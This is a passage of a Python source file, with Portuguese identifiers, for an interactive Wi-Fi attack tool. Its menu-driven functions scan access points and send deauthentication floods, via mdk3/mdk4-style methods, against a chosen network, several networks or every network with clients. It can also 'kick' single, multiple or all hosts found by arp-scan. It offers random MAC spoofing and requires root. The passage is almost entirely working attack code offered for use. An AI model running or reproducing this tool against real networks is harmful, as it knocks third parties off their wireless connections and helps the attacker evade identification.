        print(f"{C.VERMELHO}[!] {t('msg_unknown_method')}: {metodo}{C.RESET}")
        return False

# ============================================================
# FUNÇÕES DE ATAQUE
# ============================================================
def mostrar_clientes_do_ap(access_points, idx_alvo):
    if idx_alvo not in access_points:
        return []
    ap = access_points[idx_alvo]
    clientes = list(ap["clientes"])
    print(f"\n{C.CIANO}╔══════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.CIANO}║     {t('msg_clients_connected_ap'):<41} ║{C.RESET}")
    print(f"{C.CIANO}╚══════════════════════════════════════════════════╝{C.RESET}\n")
    print(f"{C.AMARELO}[*] {t('msg_ap_label')}: {C.BRANCO}{ap['essid']}{C.RESET} ({C.BRANCO}{ap['bssid']}{C.RESET})")
    print(f"{C.AMARELO}[*] {t('msg_total_clients_ap')}: {C.BRANCO}{len(clientes)}{C.RESET}\n")
    if not clientes:
        print(f"{C.AMARELO}[!] {t('msg_no_clients_ap')}{C.RESET}")
        print(f"{C.DIM}    {t('msg_attack_may_not_work')}{C.RESET}\n")
        return []
    print(f"{C.DIM}{'─'*55}{C.RESET}")
    print(f"{C.NEGRITO}{'#':<4} {'MAC Address':<18} {'Estado'}{C.RESET}")
    print(f"{C.DIM}{'─'*55}{C.RESET}")
    for idx, mac in enumerate(clientes, 1):
        print(f"  {C.BRANCO}{idx:<4} {C.CIANO}{mac:<18} {C.VERDE}{t('msg_connected')}{C.RESET}")
    print(f"{C.DIM}{'─'*55}{C.RESET}\n")
    return clientes

def deauth_uma_rede(interface):
    access_points = scan_access_points(interface)
    if not access_points:
        return
    escolha = entrada_segura(f"\n{C.AMARELO}{t('msg_select_ap')}: {C.RESET}")
    try:
        escolha = int(escolha)
        if escolha == 0:
            print(f"{C.AMARELO}[!] {t('msg_cancelled')}{C.RESET}")
            return
        if escolha not in access_points:
            print(f"{C.VERMELHO}[!] {t('msg_invalid_option')}{C.RESET}")
            return
    except ValueError:
        print(f"{C.VERMELHO}[!] {t('msg_invalid_input')}{C.RESET}")
        return
    alvo = access_points[escolha]
    clientes = mostrar_clientes_do_ap(access_points, escolha)
    if not clientes:
        confirmacao = entrada_segura(f"{C.AMARELO}{t('msg_continue_anyway')}: {C.RESET}").lower()
        if confirmacao not in ["s", "y"]:
            print(f"{C.AMARELO}[!] {t('msg_cancelled')}{C.RESET}")
            return
    print(f"\n{C.VERMELHO}[*] {t('msg_selected_target')}: {alvo['essid']} ({alvo['bssid']}){C.RESET}")
    metodo = selecionar_metodo_deauth()
    if metodo is None:
        return
    if metodo in ["mdk3", "mdk4"]:
        duracao_str = entrada_segura(f"{C.AMARELO}{t('msg_duration_prompt')} [30]: {C.RESET}")
        duracao = int(duracao_str) if duracao_str else 30
    else:
        pacotes_str = entrada_segura(f"{C.AMARELO}{t('msg_packets_prompt')} [128]: {C.RESET}")
        pacotes = int(pacotes_str) if pacotes_str else 128
    interface_mon = definir_modo_monitor(interface, ativar=True)
    if clientes:
        print(f"\n{C.CIANO}[*] {t('msg_attacking_clients')} {len(clientes)} {t('msg_client_label')}...{C.RESET}\n")
        for idx, mac_cliente in enumerate(clientes, 1):
            print(f"{C.AMARELO}[{idx}/{len(clientes)}] {t('msg_attacking_client')}: {mac_cliente}{C.RESET}")
            if metodo in ["mdk3", "mdk4"]:
                enviar_pacotes_deauth_com_feedback(interface_mon, alvo["bssid"], metodo=metodo, duracao=duracao)
            else:
                enviar_pacotes_deauth_com_feedback(interface_mon, alvo["bssid"], mac_cliente=mac_cliente, quantidade=pacotes, metodo=metodo)
            print()
    else:
        print(f"\n{C.AMARELO}[*] {t('msg_broadcast_attack')}...{C.RESET}\n")
        if metodo in ["mdk3", "mdk4"]:
            enviar_pacotes_deauth_com_feedback(interface_mon, alvo["bssid"], metodo=metodo, duracao=duracao)
        else:
            enviar_pacotes_deauth_com_feedback(interface_mon, alvo["bssid"], quantidade=pacotes, metodo=metodo)
    definir_modo_monitor(interface, ativar=False)
    entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")

def deauth_multiplas_redes(interface):
    access_points = scan_access_points(interface)
    if not access_points:
        return
    aps_com_clientes = {idx: ap for idx, ap in access_points.items() if len(ap["clientes"]) > 0}
    if not aps_com_clientes:
        print(f"\n{C.AMARELO}[!] {t('msg_no_aps_with_clients')}{C.RESET}")
        entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")
        return
    print(f"\n{C.CIANO}[*] {t('msg_aps_with_clients')}:{C.RESET}\n")
    for idx, ap in aps_com_clientes.items():
        print(f"  {C.BRANCO}{idx:<4} {C.CIANO}{ap['bssid']:<18} {C.VERDE}{len(ap['clientes'])} {t('msg_client_label')}{C.RESET} {ap['essid']}")
    print(f"\n{C.AMARELO}{t('msg_select_comma')}: {C.RESET}")
    try:
        escolhas = [int(c.strip()) for c in entrada_segura("> ").split(",") if int(c.strip()) in aps_com_clientes]
    except ValueError:
        print(f"{C.VERMELHO}[!] {t('msg_invalid_input')}{C.RESET}")
        return
    if not escolhas:
        print(f"{C.VERMELHO}[!] {t('msg_no_valid_selection')}{C.RESET}")
        return
    metodo = selecionar_metodo_deauth()
    if metodo is None:
        return
    if metodo in ["mdk3", "mdk4"]:
        duracao_str = entrada_segura(f"{C.AMARELO}{t('msg_duration_per_target')} [20]: {C.RESET}")
        duracao = int(duracao_str) if duracao_str else 20
    else:
        pacotes_str = entrada_segura(f"{C.AMARELO}{t('msg_packets_per_target')} [64]: {C.RESET}")
        pacotes = int(pacotes_str) if pacotes_str else 64
    interface_mon = definir_modo_monitor(interface, ativar=True)
    for idx in escolhas:
        alvo = aps_com_clientes[idx]
        print(f"\n{C.VERMELHO}╔══════════════════════════════════════════════════╗{C.RESET}")
        print(f"{C.VERMELHO}║  {t('msg_attacking_clients')}: {alvo['essid']:<32} ║{C.RESET}")
        print(f"{C.VERMELHO}╚══════════════════════════════════════════════════╝{C.RESET}\n")
        clientes = list(alvo["clientes"])
        print(f"{C.AMARELO}[*] {len(clientes)} {t('msg_client_label')}{C.RESET}\n")
        for mac_cliente in clientes:
            print(f"{C.CIANO}  → {t('msg_attacking_client')}: {mac_cliente}{C.RESET}")
            if metodo in ["mdk3", "mdk4"]:
                enviar_pacotes_deauth_com_feedback(interface_mon, alvo["bssid"], metodo=metodo, duracao=duracao)
            else:
                enviar_pacotes_deauth_com_feedback(interface_mon, alvo["bssid"], mac_cliente=mac_cliente, quantidade=pacotes, metodo=metodo)
            print()
    definir_modo_monitor(interface, ativar=False)
    entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")

def deauth_todas_redes(interface):
    access_points = scan_access_points(interface)
    if not access_points:
        return
    aps_com_clientes = {idx: ap for idx, ap in access_points.items() if len(ap["clientes"]) > 0}
    if not aps_com_clientes:
        print(f"\n{C.AMARELO}[!] {t('msg_no_aps_with_clients')}{C.RESET}")
        entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")
        return
    print(f"\n{C.VERMELHO}[!] {t('msg_warning_all_aps')} {len(aps_com_clientes)} {t('msg_aps_with_clients_lower')}.{C.RESET}")
    confirmacao = entrada_segura(f"{C.AMARELO}{t('msg_confirm')}: {C.RESET}").lower()
    if confirmacao not in ["s", "y"]:
        print(f"{C.AMARELO}[!] {t('msg_cancelled')}{C.RESET}")
        return
    metodo = selecionar_metodo_deauth()
    if metodo is None:
        return
    duracao = 10 if metodo in ["mdk3", "mdk4"] else 32
    interface_mon = definir_modo_monitor(interface, ativar=True)
    for idx, alvo in aps_com_clientes.items():
        print(f"\n{C.VERMELHO}[*] {t('msg_attacking_clients')}: {alvo['essid']} ({alvo['bssid']}){C.RESET}")
        print(f"{C.AMARELO}    {len(alvo['clientes'])} {t('msg_client_label')}{C.RESET}\n")
        for mac_cliente in alvo["clientes"]:
            print(f"{C.CIANO}  → {t('msg_client_mac')}: {mac_cliente}{C.RESET}")
            if metodo in ["mdk3", "mdk4"]:
                enviar_pacotes_deauth_com_feedback(interface_mon, alvo["bssid"], metodo=metodo, duracao=duracao)
            else:
                enviar_pacotes_deauth_com_feedback(interface_mon, alvo["bssid"], mac_cliente=mac_cliente, quantidade=duracao, metodo=metodo)
            print()
    definir_modo_monitor(interface, ativar=False)
    entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")

# ============================================================
# KICK CLIENTS
# ============================================================
def obter_clientes_rede(interface):
    output, _ = executar_comando(f"arp-scan -l --interface={interface} 2>/dev/null | grep -v 'packets' | grep -v '^$'")
    if not output:
        output, _ = executar_comando(f"arp -n 2>/dev/null")
    clientes = {}
    idx = 0
    if output:
        for linha in output.split("\n"):
            partes = linha.split()
            if len(partes) >= 2 and ":" in partes[1]:
                idx += 1
                clientes[idx] = {"ip": partes[0], "mac": partes[1]}
    return clientes

def expulsar_um_cliente(interface):
    limpar_ecra()
    print(f"{C.CIANO}[*] {t('msg_searching_clients')}{C.RESET}\n")
    clientes = obter_clientes_rede(interface)
    if not clientes:
        print(f"{C.AMARELO}[!] {t('msg_no_clients_found')}{C.RESET}")
        entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")
        return
    print(f"{C.VERDE}{'#':<4} {'IP':<16} {'MAC'}{C.RESET}")
    print(f"{C.DIM}{'─'*40}{C.RESET}")
    for idx, cliente in clientes.items():
        print(f"{C.BRANCO}{idx:<4} {cliente['ip']:<16} {cliente['mac']}{C.RESET}")
    escolha = entrada_segura(f"\n{C.AMARELO}{t('msg_select_client')}: {C.RESET}")
    try:
        escolha = int(escolha)
        if escolha not in clientes:
            print(f"{C.VERMELHO}[!] {t('msg_invalid_option')}{C.RESET}")
            return
    except ValueError:
        print(f"{C.VERMELHO}[!] {t('msg_invalid_input')}{C.RESET}")
        return
    alvo = clientes[escolha]
    print(f"\n{C.VERMELHO}[*] {t('msg_target_label')}: {alvo['ip']} ({alvo['mac']}){C.RESET}")
    metodo = selecionar_metodo_deauth()
    if metodo is None:
        return
    interface_mon = definir_modo_monitor(interface, ativar=True)
    if metodo in ["mdk3", "mdk4"]:
        duracao_str = entrada_segura(f"{C.AMARELO}{t('msg_duration_prompt')} [20]: {C.RESET}")
        duracao = int(duracao_str) if duracao_str else 20
        enviar_pacotes_deauth_com_feedback(interface_mon, "ff:ff:ff:ff:ff:ff", mac_cliente=alvo["mac"], metodo=metodo, duracao=duracao)
    else:
        pacotes_str = entrada_segura(f"{C.AMARELO}{t('msg_packets_prompt')} [128]: {C.RESET}")
        pacotes = int(pacotes_str) if pacotes_str else 128
        enviar_pacotes_deauth_com_feedback(interface_mon, "ff:ff:ff:ff:ff:ff", mac_cliente=alvo["mac"], quantidade=pacotes, metodo=metodo)
    definir_modo_monitor(interface, ativar=False)
    entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")

def expulsar_multiplos_clientes(interface):
    limpar_ecra()
    print(f"{C.CIANO}[*] {t('msg_searching_clients')}{C.RESET}\n")
    clientes = obter_clientes_rede(interface)
    if not clientes:
        print(f"{C.AMARELO}[!] {t('msg_no_clients_found')}{C.RESET}")
        entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")
        return
    print(f"{C.VERDE}{'#':<4} {'IP':<16} {'MAC'}{C.RESET}")
    print(f"{C.DIM}{'─'*40}{C.RESET}")
    for idx, cliente in clientes.items():
        print(f"{C.BRANCO}{idx:<4} {cliente['ip']:<16} {cliente['mac']}{C.RESET}")
    print(f"\n{C.AMARELO}{t('msg_select_comma')}: {C.RESET}")
    try:
        escolhas = [int(c.strip()) for c in entrada_segura("> ").split(",") if int(c.strip()) in clientes]
    except ValueError:
        print(f"{C.VERMELHO}[!] {t('msg_invalid_input')}{C.RESET}")
        return
    if not escolhas:
        print(f"{C.VERMELHO}[!] {t('msg_no_valid_selection')}{C.RESET}")
        return
    metodo = selecionar_metodo_deauth()
    if metodo is None:
        return
    if metodo in ["mdk3", "mdk4"]:
        duracao_str = entrada_segura(f"{C.AMARELO}{t('msg_duration_per_client')} [15]: {C.RESET}")
        duracao = int(duracao_str) if duracao_str else 15
    else:
        pacotes_str = entrada_segura(f"{C.AMARELO}{t('msg_packets_per_client')} [64]: {C.RESET}")
        pacotes = int(pacotes_str) if pacotes_str else 64
    interface_mon = definir_modo_monitor(interface, ativar=True)
    for idx in escolhas:
        alvo = clientes[idx]
        print(f"\n{C.VERMELHO}[*] {t('msg_kicking')}: {alvo['ip']} ({alvo['mac']}){C.RESET}")
        if metodo in ["mdk3", "mdk4"]:
            enviar_pacotes_deauth_com_feedback(interface_mon, "ff:ff:ff:ff:ff:ff", mac_cliente=alvo["mac"], metodo=metodo, duracao=duracao)
        else:
            enviar_pacotes_deauth_com_feedback(interface_mon, "ff:ff:ff:ff:ff:ff", mac_cliente=alvo["mac"], quantidade=pacotes, metodo=metodo)
    definir_modo_monitor(interface, ativar=False)
    print(f"\n{C.VERDE}[+] {t('msg_operations_concluded')}{C.RESET}")
    entrada_segura(f"{C.DIM}{t('msg_press_enter')}{C.RESET}")

def expulsar_todos_clientes(interface):
    limpar_ecra()
    print(f"{C.CIANO}[*] {t('msg_searching_clients')}{C.RESET}\n")
    nosso_mac, _ = executar_comando(f"cat /sys/class/net/{interface}/address 2>/dev/null")
    clientes = obter_clientes_rede(interface)
    clientes = {k: v for k, v in clientes.items() if v["mac"].lower() != nosso_mac.lower()}
    if not clientes:
        print(f"{C.AMARELO}[!] {t('msg_no_clients_found')}{C.RESET}")
        entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")
        return
    print(f"{C.VERMELHO}[!] {t('msg_warning_kick_all')} {len(clientes)} {t('msg_clients_except_you')}.{C.RESET}")
    confirmacao = entrada_segura(f"{C.AMARELO}{t('msg_confirm')}: {C.RESET}").lower()
    if confirmacao not in ["s", "y"]:
        print(f"{C.AMARELO}[!] {t('msg_cancelled')}{C.RESET}")
        return
    metodo = selecionar_metodo_deauth()
    if metodo is None:
        return
    duracao = 10 if metodo in ["mdk3", "mdk4"] else 32
    interface_mon = definir_modo_monitor(interface, ativar=True)
    for idx, alvo in clientes.items():
        print(f"{C.VERMELHO}[*] {t('msg_kicking')}: {alvo['ip']} ({alvo['mac']}){C.RESET}")
        if metodo in ["mdk3", "mdk4"]:
            enviar_pacotes_deauth_com_feedback(interface_mon, "ff:ff:ff:ff:ff:ff", mac_cliente=alvo["mac"], metodo=metodo, duracao=duracao)
        else:
            enviar_pacotes_deauth_com_feedback(interface_mon, "ff:ff:ff:ff:ff:ff", mac_cliente=alvo["mac"], quantidade=duracao, metodo=metodo)
    definir_modo_monitor(interface, ativar=False)
    print(f"\n{C.VERDE}[+] {t('msg_all_clients_kicked')}{C.RESET}")
    entrada_segura(f"{C.DIM}{t('msg_press_enter')}{C.RESET}")

# ============================================================
# MENU PRINCIPAL
# ============================================================
def mostrar_menu():
    limpar_ecra()
    print(BANNER)
    interface = obter_interface_padrao()
    estado_monitor = "MONITOR" if verificar_modo_monitor(interface) else "MANAGED"
    mac_atual = obter_mac_atual(interface)
    estado_mac = f"{C.VERMELHO}{t('mac_spoofed')}{C.RESET}" if MAC_SPOOFED else f"{C.VERDE}{t('mac_original')}{C.RESET}"

    print(f"{C.DIM}{'═'*60}{C.RESET}")
    print(f"  {t('menu_interface')}: {C.CIANO}{interface}{C.RESET}  |  {t('menu_mode')}: {C.AMARELO}{estado_monitor}{C.RESET}")
    print(f"  {t('menu_mac')}: {C.CIANO}{mac_atual}{C.RESET} {estado_mac}")
    print(f"  {t('menu_tools')}: {mostrar_ferramentas_disponiveis()}")
    print(f"{C.DIM}{'═'*60}{C.RESET}\n")

    print(f"{C.VERDE}┌─────────────────────────────────────┐{C.RESET}")
    print(f"{C.VERDE}│  {C.NEGRITO}{t('menu_scan_module')}{C.RESET}{C.VERDE}                    │{C.RESET}")
    print(f"{C.VERDE}└─────────────────────────────────────┘{C.RESET}\n")
    print(f"  {C.VERMELHO}[{C.RESET}{C.BRANCO}1{C.RESET}{C.VERMELHO}]{C.RESET} {t('opt_scan_ap')}")
    print(f"  {C.VERMELHO}[{C.RESET}{C.BRANCO}2{C.RESET}{C.VERMELHO}]{C.RESET} {t('opt_scan_hosts')}")
    print()

    print(f"{C.VERMELHO}┌─────────────────────────────────────┐{C.RESET}")
    print(f"{C.VERMELHO}│  {C.NEGRITO}{t('menu_attack_module')}{C.RESET}{C.VERMELHO}                  │{C.RESET}")
    print(f"{C.VERMELHO}└─────────────────────────────────────┘{C.RESET}\n")
    print(f"  {C.AZUL}DEAUTH{C.RESET}")
    print(f"    {C.VERMELHO}[{C.RESET}{C.BRANCO}3{C.RESET}{C.VERMELHO}]{C.RESET} {t('opt_deauth_one')}")
    print(f"    {C.VERMELHO}[{C.RESET}{C.BRANCO}4{C.RESET}{C.VERMELHO}]{C.RESET} {t('opt_deauth_multi')}")
    print(f"    {C.VERMELHO}[{C.RESET}{C.BRANCO}5{C.RESET}{C.VERMELHO}]{C.RESET} {t('opt_deauth_all')}")
    print()
    print(f"  {C.AZUL}KICK{C.RESET}")
    print(f"    {C.VERMELHO}[{C.RESET}{C.BRANCO}6{C.RESET}{C.VERMELHO}]{C.RESET} {t('opt_kick_one')}")
    print(f"    {C.VERMELHO}[{C.RESET}{C.BRANCO}7{C.RESET}{C.VERMELHO}]{C.RESET} {t('opt_kick_multi')}")
    print(f"    {C.VERMELHO}[{C.RESET}{C.BRANCO}8{C.RESET}{C.VERMELHO}]{C.RESET} {t('opt_kick_all')}")
    print()

    print(f"{C.AMARELO}┌─────────────────────────────────────┐{C.RESET}")
    print(f"{C.AMARELO}│  {C.NEGRITO}{t('menu_system_module')}{C.RESET}{C.AMARELO}                │{C.RESET}")
    print(f"{C.AMARELO}└─────────────────────────────────────┘{C.RESET}\n")
    print(f"  {C.VERMELHO}[{C.RESET}{C.BRANCO}L{C.RESET}{C.VERMELHO}]{C.RESET} 🌍 {t('opt_language')}")
    print(f"  {C.VERMELHO}[{C.RESET}{C.BRANCO}A{C.RESET}{C.VERMELHO}]{C.RESET} {t('opt_mac_spoof')}")
    print(f"  {C.VERMELHO}[{C.RESET}{C.BRANCO}9{C.RESET}{C.VERMELHO}]{C.RESET} {t('opt_restore')}")
    print(f"  {C.VERMELHO}[{C.RESET}{C.BRANCO}0{C.RESET}{C.VERMELHO}]{C.RESET} {t('opt_exit')}")
    print()
    
    print(f"{C.DIM}{'─'*60}{C.RESET}")
    print(f"{C.DIM}  {t('msg_version')}{C.RESET}")
    print(f"{C.DIM}{'─'*60}{C.RESET}\n")

# ============================================================
# MAIN
# ============================================================
def main():
    if not verificar_root():
        print(f"{C.VERMELHO}[!] {t('msg_error_root')}{C.RESET}")
        print(f"{C.AMARELO}    {t('msg_use_sudo')}{C.RESET}")
        sys.exit(1)

    def handler_sinal(sig, frame):
        print(f"\n\n{C.AMARELO}[*] {t('msg_cleaning_exit')}{C.RESET}")
        restaurar_rede(obter_interface_padrao())
        sys.exit(0)

    signal.signal(signal.SIGINT, handler_sinal)
    interface = obter_interface_padrao()

    while True:
        mostrar_menu()
        escolha = entrada_segura(f"{C.CIANO}{t('msg_prompt')}{C.RESET}").strip().lower()

        if escolha == "1": scan_access_points(interface)
        elif escolha == "2": scan_hosts(interface)
        elif escolha == "3": deauth_uma_rede(interface)
        elif escolha == "4": deauth_multiplas_redes(interface)
        elif escolha == "5": deauth_todas_redes(interface)
        elif escolha == "6": expulsar_um_cliente(interface)
        elif escolha == "7": expulsar_multiplos_clientes(interface)
        elif escolha == "8": expulsar_todos_clientes(interface)
        elif escolha == "l":
            selecionar_idioma()
        elif escolha == "a":
            if not MAC_SPOOFED:
                alterar_mac_aleatorio(interface)
                entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")
            else:
                print(f"{C.AMARELO}[!] {t('msg_mac_already_changed')}{C.RESET}")
                entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")
        elif escolha == "9":
            restaurar_rede(interface)
            entrada_segura(f"\n{C.DIM}{t('msg_press_enter')}{C.RESET}")
        elif escolha == "0":
            print(f"\n{C.AMARELO}[*] {t('msg_cleaning_exit')}{C.RESET}")
            restaurar_rede(interface)
            print(f"{C.VERDE}[+] {t('msg_goodbye')}{C.RESET}")
            sys.exit(0)
        else:
            print(f"{C.VERMELHO}[!] {t('msg_invalid_option_menu')}{C.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()